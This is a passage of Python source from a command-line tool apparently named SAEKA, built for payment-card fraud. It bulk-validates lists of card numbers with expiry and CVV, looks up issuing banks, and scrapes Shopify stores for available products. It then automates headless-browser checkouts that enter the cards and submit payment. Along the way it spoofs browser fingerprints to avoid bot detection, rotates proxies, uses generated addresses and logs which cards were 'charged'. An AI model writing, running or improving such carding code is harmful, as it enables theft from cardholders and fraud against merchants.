            h = re.sub(r"\.(xml|json|html)$", "", h)
            if h and h not in handles:
                handles.append(h)
        if handles:
            break

    # 2. homepage scrape
    if not handles:
        r = _get(f"https://{domain}/")
        if r and r.status_code == 200:
            handles = _extract_handles(r.text)

    # 3. /collections/all scrape
    if not handles:
        r = _get(f"https://{domain}/collections/all")
        if r and r.status_code == 200:
            handles = _extract_handles(r.text)

    if not handles:
        result = {"error": "no handles"}
        with _VARIANT_LOCK:
            _VARIANT_CACHE[domain] = result
        return result

    random.shuffle(handles)
    variants = []
    for h in handles[:10]:
        try:
            r = requests.get(f"https://{domain}/products/{h}.js",
                             headers=ua, timeout=12, proxies=px)
            if not r or r.status_code != 200:
                continue
            data = r.json()
            for v in data.get("variants", []):
                if v.get("available"):
                    variants.append({
                        "title": data.get("title", "")[:60],
                        "variant_id": v["id"],
                        "price": str(v.get("price", 0) / 100),
                    })
                    break
            if len(variants) >= 5:
                break
        except Exception:
            continue

    result = {"variants": variants} if variants else {"error": "no available variants"}
    with _VARIANT_LOCK:
        _VARIANT_CACHE[domain] = result
    return result

def build_checkout_url(domain, variant_id):
    return (f"https://{domain}/cart/{variant_id}:1"
            f"?skip_shop_pay=true&auto_redirect=false")

# =========================================================
#  BROWSER DETECTION
# =========================================================
def find_chromium():
    env_path = os.environ.get("CHROMIUM_PATH")
    if env_path and os.path.isfile(env_path):
        return env_path
    for c in ["/data/data/com.termux/files/usr/lib/chromium/chrome",
              "/data/data/com.termux/files/usr/bin/chromium-browser",
              "/data/data/com.termux/files/usr/bin/chromium",
              "/usr/bin/chromium-browser", "/usr/bin/chromium",
              "/usr/bin/google-chrome", "/usr/bin/google-chrome-stable"]:
        if os.path.isfile(c):
            return c
    for name in ("chromium-browser", "chromium", "google-chrome"):
        try:
            path = subprocess.check_output(["which", name],
                                           stderr=subprocess.DEVNULL).decode().strip()
            if path:
                return path
        except Exception:
            pass
    return None

CHROMIUM_PATH = find_chromium()
_BROWSER_ENGINE = None

def detect_browser_engine():
    global _BROWSER_ENGINE
    if _BROWSER_ENGINE is not None:
        return _BROWSER_ENGINE
    try:
        import playwright  # noqa
        _BROWSER_ENGINE = "playwright"
        return _BROWSER_ENGINE
    except ImportError:
        pass
    return None

# =========================================================
#  PLAYWRIGHT CHECKOUT
# =========================================================
def _run_async(coro):
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

async def _playwright_checkout(checkout_url, cc, address,
                               proxy_url=None, headless=True, timeout_ms=45000):
    from playwright.async_api import async_playwright
    parts = cc.split("|")
    num, mm, yy, cvv = parts
    if len(yy) == 2:
        yy = "20" + yy
    mm_short = mm.zfill(2)
    yy_short = yy[-2:]
    result = {"status": "error", "message": "unknown", "url": checkout_url}

    async with async_playwright() as pw:
        launch_args = ["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage",
                       "--disable-blink-features=AutomationControlled",
                       "--disable-features=IsolateOrigins,site-per-process"]
        launch_kwargs = {"headless": headless, "args": launch_args}
        if CHROMIUM_PATH:
            launch_kwargs["executable_path"] = CHROMIUM_PATH
        ctx_kwargs = {
            "user_agent": "Mozilla/5.0 (Linux; Android 13; SM-S901B) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/137.0.0.0 Mobile Safari/537.36",
            "viewport": {"width": 412, "height": 915},
            "device_scale_factor": 2.625,
            "is_mobile": True, "has_touch": True,
            "locale": "en-US", "timezone_id": "America/New_York",
        }
        if proxy_url:
            pp = urlparse(proxy_url)
            ctx_kwargs["proxy"] = {"server": f"{pp.scheme}://{pp.hostname}:{pp.port}"}
            if pp.username:
                ctx_kwargs["proxy"]["username"] = pp.username
                ctx_kwargs["proxy"]["password"] = pp.password

        browser = await pw.chromium.launch(**launch_kwargs)
        context = await browser.new_context(**ctx_kwargs)
        page = await context.new_page()
        await page.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            window.chrome = { runtime: {} };
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US','en'] });
            Object.defineProperty(navigator, 'plugins', { get: () => [1,2,3,4,5] });
        """)
        try:
            await page.goto(checkout_url, wait_until="domcontentloaded",
                            timeout=timeout_ms)
            await page.wait_for_timeout(2500)
            body_text = (await page.content()).lower()
            if any(x in body_text for x in ("captcha", "hcaptcha", "recaptcha")):
                result = {"status": "captcha", "message": "captcha on checkout",
                          "url": checkout_url}
                await browser.close()
                return result

            # email
            for sel in ['input[type="email"]', 'input[name="email"]',
                        'input[autocomplete="email"]']:
                try:
                    el = page.locator(sel).first
                    if await el.count() > 0 and await el.is_visible():
                        await el.fill(address["email"])
                        break
                except Exception:
                    continue

            field_map = [
                (["input[name='firstName']", "input[autocomplete='given-name']",
                  "input[id*='firstName']"], address["first_name"]),
                (["input[name='lastName']", "input[autocomplete='family-name']",
                  "input[id*='lastName']"], address["last_name"]),
                (["input[name='address1']", "input[autocomplete='address-line1']",
                  "input[id*='address1']"], address["address1"]),
                (["input[name='address2']", "input[autocomplete='address-line2']",
                  "input[id*='address2']"], address["address2"]),
                (["input[name='city']", "input[autocomplete='address-level2']",
                  "input[id*='city']"], address["city"]),
                (["input[name='postalCode']", "input[autocomplete='postal-code']",
                  "input[id*='postalCode']"], address["zip"]),
                (["input[name='phone']", "input[autocomplete='tel']",
                  "input[id*='phone']"], address["phone"]),
            ]
            for sels, val in field_map:
                if not val:
                    continue
                for sel in sels:
                    try:
                        el = page.locator(sel).first
                        if await el.count() > 0 and await el.is_visible():
                            await el.fill(str(val))
                            await page.wait_for_timeout(120)
                            break
                    except Exception:
                        continue

            try:
                prov = page.locator("select[name='province']").first
                if await prov.count() > 0:
                    await prov.select_option(value=address["province_code"])
                    await page.wait_for_timeout(400)
            except Exception:
                pass

            card_filled = False
            for frame_sel in ['iframe[title="Payment"]', 'iframe[title="Secure payment"]',
                              'iframe.card-fields-iframe', 'iframe[src*="card-fields"]',
                              'iframe[id^="card-fields"]']:
                try:
                    frame = page.frame_locator(frame_sel)
                    if await frame.locator("input").count() == 0:
                        continue
                    for label, value in [
                        ("Card number", f"{num}"),
                        ("Expiration date", f"{mm_short}/{yy_short}"),
                        ("Security code", cvv),
                        ("Name on card", f"{address['first_name']} {address['last_name']}"),
                    ]:
                        try:
                            await frame.get_by_label(label).fill(value, timeout=2000)
                        except Exception:
                            pass
                    for sel, value in [
                        ("input[name='number']", num),
                        ("input[name='expiry']", f"{mm_short}/{yy_short}"),
                        ("input[name='verification_value']", cvv),
                        ("input[name='name']",
                         f"{address['first_name']} {address['last_name']}"),
                    ]:
                        try:
                            el = frame.locator(sel).first
                            if await el.count() > 0:
                                await el.fill(value, timeout=1500)
                        except Exception:
                            pass
                    card_filled = True
                    break
                except Exception:
                    continue

            if not card_filled:
                result = {"status": "error", "message": "card iframe not found",
                          "url": checkout_url}
                await browser.close()
                return result

            await page.wait_for_timeout(800)

            submitted = False
            for sel in ['button[id="checkout-pay-button"]', 'button[type="submit"]',
                        'button:has-text("Pay now")', 'button:has-text("Complete order")',
                        'button:has-text("Pay")']:
                try:
                    btn = page.locator(sel).first
                    if await btn.count() > 0 and await btn.is_visible():
                        await btn.click()
                        submitted = True
                        break
                except Exception:
                    continue

            if not submitted:
                result = {"status": "error", "message": "submit not found",
                          "url": checkout_url}
                await browser.close()
                return result

            await page.wait_for_timeout(6000)
            final_url = page.url
            content = (await page.content()).lower()

            if "3d" in final_url.lower() or "challenge" in final_url.lower():
                result = {"status": "3ds", "message": "3DS challenge", "url": final_url}
            elif any(x in final_url for x in ("/thank_you", "thank-you")) \
                    or any(x in content for x in ("order confirmed", "order#")):
                result = {"status": "charged", "message": "order placed", "url": final_url}
            elif "declined" in content or "card was declined" in content:
                result = {"status": "declined", "message": "card declined", "url": final_url}
            elif "insufficient" in content:
                result = {"status": "declined", "message": "insufficient funds", "url": final_url}
            elif "expired" in content:
                result = {"status": "declined", "message": "card expired", "url": final_url}
            elif "captcha" in content:
                result = {"status": "captcha", "message": "captcha mid-flow", "url": final_url}
            else:
                err_text = ""
                try:
                    err_el = page.locator("[role='alert'], .error, [class*='error']").first
                    if await err_el.count() > 0:
                        err_text = (await err_el.inner_text())[:120]
                except Exception:
                    pass
                result = {"status": "unknown",
                          "message": err_text or "no clear result",
                          "url": final_url}
        except Exception as e:
            result = {"status": "error", "message": str(e)[:120], "url": checkout_url}
        finally:
            with contextlib.suppress(Exception):
                await browser.close()

    return result

def playwright_checkout(checkout_url, cc, address, proxy_url=None):
    headless = CFG.get("headless", True)
    timeout_ms = CFG.get("timeout_ms", 45000)
    try:
        return _run_async(_playwright_checkout(
            checkout_url, cc, address, proxy_url, headless, timeout_ms))
    except Exception as e:
        return {"status": "error", "message": str(e)[:120], "url": checkout_url}

def browser_checkout(domain, cc, address, pool=None):
    engine = detect_browser_engine()
    if not engine:
        return {"status": "error",
                "message": "playwright not installed",
                "url": ""}
    info = fetch_variant(domain, pool=pool)
    if "error" in info:
        return {"status": "error", "message": f"variant: {info['error']}", "url": ""}
    variant = random.choice(info["variants"])
    url = build_checkout_url(domain, variant["variant_id"])

    proxy_url = None
    if pool and len(pool):
        raw = pool.next()
        if raw:
            proxy_url = resolve_browser_proxy(raw)

    res = playwright_checkout(url, cc, address, proxy_url=proxy_url)
    res.setdefault("product", variant["title"])
    res.setdefault("price", variant["price"])
    return res

# =========================================================
#  STORE VALIDATOR
# =========================================================
def _probe_store(domain, pool):
    result = {"domain": domain, "shopify": False, "categories": [], "error": None}
    try:
        proxy = pool.next() if pool else None
        r = requests.get(f"https://{domain}/products.json?limit=20", timeout=12,
                         headers={"User-Agent": "Mozilla/5.0"},
                         proxies=proxy_dict(proxy))
        if r.status_code != 200:
            result["error"] = f"HTTP {r.status_code}"
            return result
        products = r.json().get("products") or []
        if not products:
            result["error"] = "no products"
            return result
        result["shopify"] = True
        cats = set()
        for p in products[:10]:
            if p.get("product_type"):
                cats.add(p["product_type"].strip())
            for t in (p.get("tags") or [])[:3]:
                if t and len(t) < 30:
                    cats.add(t.strip())
        result["categories"] = sorted(cats)[:15]
    except Exception as e:
        result["error"] = str(e)[:80]
    return result

def load_cached_stores():
    if not os.path.isfile(STORE_CACHE):
        return []
    try:
        with open(STORE_CACHE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return []

def save_store_cache(stores):
    with open(STORE_CACHE, "w", encoding="utf-8") as f:
        json.dump(stores, f, indent=2, ensure_ascii=False)

def validate_all_stores(pool):
    clear()
    print()
    print(center(G0 + "validating shopify stores" + RS))
    print(center(DM + f"{len(SHOPIFY_DOMAINS)} domains" + RS))
    print()
    live = []
    total = len(SHOPIFY_DOMAINS)
    done = 0
    w = term_w()
    with ThreadPoolExecutor(max_workers=12) as tp:
        futures = {tp.submit(_probe_store, d, pool): d for d in SHOPIFY_DOMAINS}
        for fut in as_completed(futures):
            res = fut.result()
            done += 1
            sys.stdout.write("\r" + " " * w + "\r")
            sys.stdout.flush()
            bar_w = 32
            pct = done / total
            filled = int(bar_w * pct)
            bar = "█" * filled + DM + "░" * (bar_w - filled) + RS
            prefix = f"  {bar}  {WH}{done:>4}/{total:<4}{RS}  {YL}{pct*100:5.1f}%{RS}  "
            sys.stdout.write(prefix)
            sys.stdout.flush()
            if res["shopify"]:
                live.append(res)
    print()
    print()
    print("  " + G0 + f"✓ {len(live)} live stores" + RS)
    save_store_cache(live)
    return live

def get_categories(stores):
    cats = set()
    for s in stores:
        for c in s.get("categories", []):
            if c and 2 < len(c) < 30:
                cats.add(c.strip())
    return sorted(cats)

# =========================================================
#  STORAGE
# =========================================================
class Storage:
    def __init__(self, folder):
        self.folder = folder
        os.makedirs(folder, exist_ok=True)
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.hits = os.path.join(folder, f"hits_{stamp}.txt")
        self.full = os.path.join(folder, f"full_{stamp}.txt")
        self.charged = os.path.join(folder, f"charged_{stamp}.txt")
        self.urls = os.path.join(folder, f"urls_{stamp}.txt")
        self._lock = threading.Lock()
        for p in (self.hits, self.full, self.charged, self.urls):
            with open(p, "a", encoding="utf-8") as f:
                f.write(f"# run {datetime.now().isoformat(timespec='seconds')}\n")
    def write(self, cc, api_res, bin_res=None, co_res=None):
        with self._lock:
            with open(self.hits, "a", encoding="utf-8") as f:
                f.write(cc + "\n")
            b = bin_res or {}
            line = (f"{cc}\t{api_res.get('status','')}\t"
                    f"{b.get('scheme','')}\t{b.get('bank','')}\t"
                    f"{b.get('country','')}\t{b.get('country_code','')}\n")
            with open(self.full, "a", encoding="utf-8") as f:
                f.write(line)
            if co_res:
                if co_res.get("status") == "approved":
                    with open(self.charged, "a", encoding="utf-8") as f:
                        f.write(f"{cc}\t{co_res.get('message','')}\n")
                if co_res.get("status") == "charged":
                    with open(self.charged, "a", encoding="utf-8") as f:
                        f.write(f"{cc}\t{co_res.get('message','')}\t{co_res.get('url','')}\n")
                if co_res.get("url"):
                    with open(self.urls, "a", encoding="utf-8") as f:
                        f.write(f"{cc}\t{co_res.get('status')}\t{co_res['url']}\n")

# =========================================================
#  RENDER
# =========================================================
STATUS_C = {
    "live": G0, "charged": G0, "approved": G0, "url_ready": CY,
    "dead": RD, "declined": RD,
    "error": YL, "unknown": YL, "3ds": MG, "captcha": YL,
}

def render_compact(cc, api_res, bin_res=None, co_res=None):
    st = str(api_res.get("status", "unknown")).lower()
    col = STATUS_C.get(st, YL)
    tag = f"{col}{st.upper():<7}{RS}"
    extras = []
    if api_res.get("network"):
        extras.append(str(api_res["network"]))
    b = bin_res or {}
    if b.get("bank"):
        extras.append(b["bank"])
    if b.get("country"):
        extras.append(f"{b['country']} {b.get('country_emoji','')}".strip())
    if b.get("type"):
        extras.append(b["type"])
    extra = ("  " + DM + " · ".join(extras) + RS) if extras else ""
    co = ""
    if co_res:
        cs = co_res.get("status", "unknown").lower()
        co = f"  {STATUS_C.get(cs, YL)}⌁ {cs}{RS}"
        if co_res.get("message"):
            co += f"  {DM}{co_res['message'][:40]}{RS}"
    print(f"  {tag}  {WH}{cc}{RS}{extra}{co}")

def render_block(cc, api_res, bin_res=None, co_res=None):
    st = str(api_res.get("status", "unknown")).lower()
    col = STATUS_C.get(st, YL)
    b = Box(title="result")
    b.add(f"  {DM}card{RS}     {WH}{cc}{RS}")
    b.add(f"  {DM}status{RS}   {col}{st.upper()}{RS}")
    for k, lbl in (("message", "message"), ("network", "network"),
                   ("color", "color"), ("card", "card")):
        v = api_res.get(k)
        if v:
            b.add(f"  {DM}{lbl:<9}{RS}{WH}{v}{RS}")
    if bin_res and not bin_res.get("error"):
        b.add(f"  {DM}bin{RS}      {WH}{extract_bin(cc)}{RS}")
        for k, lbl in (("scheme", "scheme"), ("type", "type")):
            if bin_res.get(k):
                b.add(f"  {DM}{lbl:<9}{RS}{WH}{bin_res[k]}{RS}")
        if bin_res.get("bank"):
            b.add(f"  {DM}bank{RS}     {G0}{bin_res['bank']}{RS}")
        if bin_res.get("country"):
            emoji = bin_res.get("country_emoji", "")
            cc_ = bin_res.get("country_code", "")
            b.add(f"  {DM}country{RS}  {WH}{bin_res['country']} ({cc_}) {emoji}{RS}")
        if bin_res.get("prepaid"):
            b.add(f"  {DM}prepaid{RS}  {YL}yes{RS}")
    if co_res:
        cs = co_res.get("status", "unknown").lower()
        b.add(f"  {DM}driver{RS}   {STATUS_C.get(cs, YL)}{cs.upper()}{RS}")
        if co_res.get("message"):
            b.add(f"  {DM}message{RS}  {WH}{co_res['message']}{RS}")
        if co_res.get("product"):
            b.add(f"  {DM}product{RS}  {WH}{co_res['product'][:50]}{RS}")
        if co_res.get("url"):
            b.add(f"  {DM}url{RS}      {CY}{co_res['url'][:box_w()-16]}{RS}")
    b.render()
    print()

# =========================================================
#  STARTUP
# =========================================================
def startup_verify():
    clear()
    print(); print()
    sp = StartupSpinner()
    sp.start()
    checks = [
        ("initializing runtime", 0.4),
        ("checking python", 0.3),
        ("checking dependencies", 0.35),
        ("loading config", 0.3),
        ("verifying storage", 0.35),
        ("checking api reachability", 0.9),
        ("checking proxy pool", 0.5),
        ("checking browser engine", 0.5),
        ("checking for updates", 0.7),
        ("loading address", 0.3),
        ("ready", 0.4),
    ]
    for label, dur in checks:
        sp.set_status(label)
        time.sleep(dur)
    sp.stop()

# =========================================================
#  MENU
# =========================================================
class Menu:
    def __init__(self, title, subtitle=""):
        self.title = title
        self.subtitle = subtitle
        self.items = []
    def add(self, key, label, func):
        self.items.append((key, label, func)); return self
    def render(self):
        clear()
        print()
        print(center(f"{G0}◆ SAEKA ◆{RS}"))
        if self.subtitle:
            print(center(DM + self.subtitle + RS))
        print()
        w = box_w()
        inner = w - 2
        print("  " + G2 + "┌" + ("─" * inner) + "┐" + RS)
        tv = _vlen(self.title)
        left = max(0, (inner - tv) // 2)
        right = max(0, inner - left - tv)
        print("  " + G2 + "│" + RS + " " * left + WH + self.title + RS
              + " " * right + G2 + "│" + RS)
        print("  " + G2 + "├" + ("─" * inner) + "┤" + RS)
        for key, label, _ in self.items:
            line = f"  {WH}[{key}]{RS}  {G1}{label}{RS}"
            pad = max(0, inner - 1 - _vlen(line))
            print("  " + G2 + "│" + RS + line + (" " * pad) + G2 + "│" + RS)
        print("  " + G2 + "└" + ("─" * inner) + "┘" + RS)
        print()
        return input(f"  {CY}▶ {WH}").strip()

# =========================================================
#  FLOW: SINGLE CHECK
# =========================================================
def flow_single_check():
    pool = build_pool()
    clear()
    b = Box(title="single check")
    b.add(f"  {DM}proxies{RS}  {WH}{len(pool) if pool else 0} loaded{RS}")
    b.add(f"  {DM}stripe{RS}   {WH}{'enabled' if CFG.get('stripe_pk') else 'disabled'}{RS}")
    b.add(f"  {DM}back{RS}     {WH}type < to return{RS}")
    b.render()
    print()
    while True:
        cc = input(f"  {CY}▶ {WH}card {DM}(card|mm|yy|cvv){RS}  ").strip()
        if cc == "<" or cc == "":
            return
        if not CC_RE.match(cc):
            print("  " + RD + "✗ format: 4111111111111111|12|25|123" + RS)
            continue
        bin_num = extract_bin(cc)
        with Spinner("api check"):
            api_res = api_check(cc, pool=pool)
        with Spinner("bin lookup"):
            bin_res = lookup_bin(bin_num, pool=pool)
        co_res = None
        if CFG.get("stripe_pk"):
            with Spinner("stripe"):
                co_res = stripe_check(cc, pool=pool)
        print()
        render_block(cc, api_res, bin_res, co_res)
        if api_res.get("status") == "live" or (co_res and co_res.get("status") == "approved"):
            Storage(ensure_storage()).write(cc, api_res, bin_res, co_res)

# =========================================================
#  FLOW: BULK CHECK
# =========================================================
def flow_bulk_check():
    pool = build_pool()
    clear()
    b = Box(title="bulk check")
    b.add(f"  {DM}proxies{RS}  {WH}{len(pool) if pool else 0} loaded{RS}")
    b.add(f"  {DM}storage{RS}  {WH}{ensure_storage()}{RS}")
    b.add(f"  {DM}back{RS}     {WH}type < to return{RS}")
    b.render()
    print()

    path = choose_file(ext=".txt", title="select card file")
    if not path:
        return

    ccs_raw = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for ln in f:
            s = ln.strip()
            if not s or s.startswith("#"):
                continue
            parts = s.split("|")
            if len(parts) == 5 and parts[0] and not parts[0][0].isdigit():
                s = "|".join(parts[1:])
            ccs_raw.append(s)
    seen = set()
    ccs = []
    for c in ccs_raw:
        if c not in seen:
            ccs.append(c); seen.add(c)
    if not ccs:
        print("  " + RD + "✗ no cards in file" + RS)
        time.sleep(1.2)
        return

    clear()
    b = Box(title="output folder")
    b.add(f"  {WH}[1]{RS}  default  {DM}{ensure_storage()}{RS}")
    b.add(f"  {WH}[2]{RS}  choose different folder")
    b.add(f"  {WH}[0]{RS}  cancel")
    b.render()
    print()
    oc = input(f"  {CY}▶ {WH}").strip()
    if oc == "0":
        return
    if oc == "2":
        out = choose_dir(title="select output folder")
        if not out:
            return
    else:
        out = ensure_storage()

    try:
        t = input(f"  {CY}▶ {WH}threads {DM}[8]{RS}  ").strip() or "8"
        workers = max(1, min(64, int(t)))
    except ValueError:
        workers = 8

    store = Storage(out)
    counts = {"live": 0, "dead": 0, "unknown": 0, "error": 0, "charged": 0}
    total = len(ccs)
    t0 = time.time()

    def worker(cc):
        api_res = api_check(cc, pool=pool, retries=2)
        bin_res = lookup_bin(extract_bin(cc), pool=pool)
        return cc, api_res, bin_res

    print()
    w = term_w()
    print("  " + G2 + "─" * (w - 4) + RS)
    with ThreadPoolExecutor(max_workers=workers) as tp:
        futures = {tp.submit(worker, cc): cc for cc in ccs}
        done_n = 0
        for fut in as_completed(futures):
            try:
                cc, api_res, bin_res = fut.result(timeout=90)
            except Exception as e:
                cc = futures[fut]
                api_res = {"status": "error", "message": str(e)[:60]}
                bin_res = {}
            done_n += 1
            st = str(api_res.get("status", "unknown")).lower()
            if st in counts:
                counts[st] += 1
            else:
                counts["unknown"] += 1
            prefix = f"  {DM}[{done_n:>4}/{total:<4}]{RS}  "
            sys.stdout.write("\r" + " " * w + "\r")
            sys.stdout.flush()
            print(prefix, end="")
            render_compact(cc, api_res, bin_res)
            if st in ("live", "charged"):
                store.write(cc, api_res, bin_res)
    print("  " + G2 + "─" * (w - 4) + RS)

    elapsed = time.time() - t0
    live_pct = (counts["live"] / total * 100) if total else 0
    print()
    b = Box(title="summary")
    b.add(f"  {DM}live{RS}     {G0}{counts['live']:<5}{RS}  ({live_pct:5.1f}%)")
    b.add(f"  {DM}dead{RS}     {RD}{counts['dead']:<5}{RS}")
    b.add(f"  {DM}unknown{RS}  {YL}{counts['unknown']:<5}{RS}")
    b.add(f"  {DM}error{RS}    {RD}{counts['error']:<5}{RS}")
    b.add(f"  {DM}time{RS}     {WH}{elapsed:6.1f}s{RS}  ({total/max(elapsed,0.1):.0f} cc/s)")
    b.add(f"  {DM}hits{RS}     {G1}{store.hits}{RS}")
    b.render()
    print()
    input("  " + DM + "enter to continue" + RS)

# =========================================================
#  FLOW: SHOPIFY BROWSER CHECKOUT
# =========================================================
def flow_shopify_browser():
    engine = detect_browser_engine()
    if not engine:
        clear()
        print()
        b = Box(title="browser engine missing")
        b.add(f"  {RD}playwright not installed{RS}")
        b.add(f"  {DM}run:{RS}")
        b.add(f"  {WH}pip install playwright{RS}")
        b.add(f"  {WH}python -m playwright install chromium{RS}")
        b.render()
        print()
        input("  " + DM + "enter to continue" + RS)
        return
    if not CHROMIUM_PATH:
        clear()
        print()
        b = Box(title="chromium missing")
        b.add(f"  {RD}no chromium binary found{RS}")
        b.add(f"  {DM}run: pkg install chromium{RS}")
        b.add(f"  {DM}or: export CHROMIUM_PATH=/path/to/chrome{RS}")
        b.render()
        print()
        input("  " + DM + "enter to continue" + RS)
        return

    pool = build_pool()
    stores = load_cached_stores()
    if not stores:
        clear()
        print()
        b = Box(title="shopify store cache")
        b.add(f"  {YL}no cache — validating now{RS}")
        b.add(f"  {DM}this takes 3-5 min for {len(SHOPIFY_DOMAINS)} domains{RS}")
        b.render()
        print()
        yn = input(f"  {YL}run validation? (y/n) {RS}").strip().lower()
        if yn != "y":
            return
        stores = validate_all_stores(pool)
        if not stores:
            print("  " + RD + "no live stores found" + RS)
            time.sleep(1.2)
            return

    cats = get_categories(stores)
    if not cats:
        print("  " + RD + "no categories found" + RS)
        time.sleep(1.2)
        return

    clear()
    print()
    b = Box(title="product categories")
    for i, c in enumerate(cats, 1):
        b.add(f"  {WH}[{i:>2}]{RS}  {c}")
    b.add(f"  {WH}[ 0]{RS}  all categories")
    b.add(f"  {WH}[ r]{RS}  re-validate stores")
    b.add(f"  {WH}[ q]{RS}  cancel")
    b.render()
    print()
    sel = input(f"  {CY}▶ {WH}").strip()
    if sel.lower() == "q":
        return
    if sel.lower() == "r":
        stores = validate_all_stores(pool)
        save_store_cache(stores)
        return
    if sel == "0" or sel == "":
        chosen = cats
    else:
        chosen = []
        for part in sel.split(","):
            try:
                i = int(part.strip()) - 1
                if 0 <= i < len(cats):
                    chosen.append(cats[i])
            except ValueError:
                pass
    if not chosen:
        return

    filtered = [s for s in stores if any(c in s.get("categories", []) for c in chosen)]
    if not filtered:
        print("  " + RD + "no stores match" + RS)
        time.sleep(1.2)
        return

    print()
    print("  " + DM + f"  ✓ {len(filtered)} stores match selected categories" + RS)
    print()

    path = choose_file(ext=".txt", title="select card file")
    if not path:
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        ccs = []
        for ln in f:
            s = ln.strip()
            if not s or s.startswith("#"):
                continue
            parts = s.split("|")
            if len(parts) == 5 and parts[0] and not parts[0][0].isdigit():
                s = "|".join(parts[1:])
            ccs.append(s)
    seen = set()
    ccs = [c for c in ccs if not (c in seen or seen.add(c))]
    if not ccs:
        print("  " + RD + "empty" + RS)
        time.sleep(1.2)
        return

    addr = CFG.get("address") or generate_address()
    if not addr.get("email"):
        addr = generate_address()
        CFG["address"] = addr
        save_config(CFG)

    clear()
    print()
    b = Box(title="shopify browser checkout")
    b.add(f"  {DM}engine{RS}   {WH}{engine}{RS}")
    b.add(f"  {DM}chromium{RS} {WH}{(CHROMIUM_PATH or 'auto')[:50]}{RS}")
    b.add(f"  {DM}headless{RS} {WH}{CFG.get('headless', True)}{RS}")
    b.add(f"  {DM}proxies{RS}  {WH}{len(pool) if pool else 0}{RS}")
    b.add(f"  {DM}stores{RS}   {WH}{len(filtered)}{RS}")
    b.add(f"  {DM}cards{RS}    {WH}{len(ccs)}{RS}")
    b.add(f"  {DM}address{RS}  {WH}{addr['first_name']} {addr['last_name']}, "
          f"{addr['city']}, {addr['province_code']}{RS}")
    b.render()
    print()
    b = Box(title="note")
    b.add(f"  {YL}each card opens a real browser — 15-40s per card{RS}")
    b.add(f"  {DM}datacenter proxies will hit captcha{RS}")
    b.render()
    print()
    if input(f"  {YL}continue? (y/n) {RS}").strip().lower() != "y":
        return

    store_out = Storage(ensure_storage())
    hits = charged = declined = errors = 0
    t0 = time.time()
    total = len(ccs)

    for idx, cc in enumerate(ccs, 1):
        print(f"\n  {DM}[{idx}/{total}]{RS}  {WH}{cc}{RS}")
        with Spinner("api"):
            api_res = api_check(cc, pool=pool)
        if api_res.get("status") != "live":
            st = api_res.get("status", "?")
            print(f"  {STATUS_C.get(st, YL)}{st.upper()}{RS}  skipping browser")
            continue
        hits += 1
        with Spinner("bin"):
            bin_res = lookup_bin(extract_bin(cc), pool=pool)
        print(f"  {G0}LIVE{RS}  → launching browser...")

        domain_info = random.choice(filtered)
        domain = domain_info["domain"]
        print(f"  {DM}store:{RS} {WH}{domain}{RS}")

        co_res = browser_checkout(domain, cc, addr, pool=pool)

        render_compact(cc, api_res, bin_res, co_res)
        if co_res.get("product"):
            print(f"  {DM}↳ {co_res['product'][:60]}  ${co_res.get('price','')}{RS}")
        if co_res.get("url"):
            print(f"  {CY}{co_res['url'][:min(100, term_w()-4)]}{RS}")

        st = co_res.get("status", "unknown")
        if st == "charged":
            charged += 1
        elif st == "declined":
            declined += 1
        else:
            errors += 1

        store_out.write(cc, api_res, bin_res, co_res)

    elapsed = time.time() - t0
    print()
    b = Box(title="browser checkout summary")
    b.add(f"  {DM}live checked{RS}  {G0}{hits}{RS}")
    b.add(f"  {DM}charged{RS}       {G0}{charged}{RS}")
    b.add(f"  {DM}declined{RS}      {RD}{declined}{RS}")
    b.add(f"  {DM}errors/other{RS}  {YL}{errors}{RS}")
    b.add(f"  {DM}elapsed{RS}       {WH}{elapsed:.1f}s{RS}")
    b.add(f"  {DM}charged file{RS}  {G1}{store_out.charged}{RS}")
    b.add(f"  {DM}urls file{RS}     {G1}{store_out.urls}{RS}")
    b.render()
    print()
    input("  " + DM + "enter to continue" + RS)

# =========================================================
#  FLOW: PROXY CONFIG
# =========================================================
def flow_proxy_config():
    metrics = ProxyMetrics()
    while True:
        proxies = CFG.get("proxies") or []
        norm = [n for n in (normalize_proxy(p) for p in proxies) if n]
        pool = ProxyPool(norm, metrics) if norm else None
        health = pool.health() if pool else 0

        m = Menu("proxy configuration",
                 subtitle=f"health: {health:.0f}%  ·  total: {len(proxies)}")
        m.add("1", "add proxy (wizard)", lambda: _proxy_add(metrics))
        m.add("2", "import from .txt", lambda: _proxy_import())
        m.add("3", f"list ({len(proxies)})", lambda: _proxy_list(metrics))
        m.add("4", "remove one", lambda: _proxy_remove())
        m.add("5", "clear all", lambda: _proxy_clear(metrics))
        m.add("6", "test proxy", lambda: _proxy_test(metrics))
        m.add("7", "view statistics", lambda: _proxy_stats(metrics))
        m.add("<", "back", lambda: None)
        c = m.render()
        if c == "<" or c == "":
            return
        handlers = {"1": _proxy_add, "2": _proxy_import, "3": _proxy_list,
                    "4": _proxy_remove, "5": _proxy_clear, "6": _proxy_test,
                    "7": _proxy_stats}
        fn = handlers.get(c)
        if not fn:
            print("  " + RD + "invalid" + RS)
            time.sleep(0.4)
            continue
        try:
            if fn in (_proxy_import, _proxy_remove):
                fn()
            else:
                fn(metrics)
        except KeyboardInterrupt:
            print()

def _proxy_add(metrics):
    clear()
    b = Box(title="add proxy")
    b.add(f"  {DM}scheme{RS}   http / https / socks5")
    b.add(f"  {DM}format{RS}   scheme://user:pass@host:port")
    b.render()
    print()
    scheme = input(f"  {CY}▶ {WH}scheme {DM}[http]{RS}  ").strip().lower() or "http"
    if scheme not in ("http", "https", "socks4", "socks4a", "socks5", "socks5h"):
        print("  " + RD + "✗ invalid scheme" + RS); time.sleep(1); return
    host = input(f"  {CY}▶ {WH}hostname{RS}  ").strip()
    if not host:
        return
    try:
        port = int(input(f"  {CY}▶ {WH}port{RS}  ").strip())
        if not (1 <= port <= 65535):
            raise ValueError
    except ValueError:
        print("  " + RD + "✗ invalid port" + RS); time.sleep(1); return
    user = input(f"  {CY}▶ {WH}username {DM}(optional){RS}  ").strip()
    pwd = input(f"  {CY}▶ {WH}password {DM}(optional){RS}  ").strip()
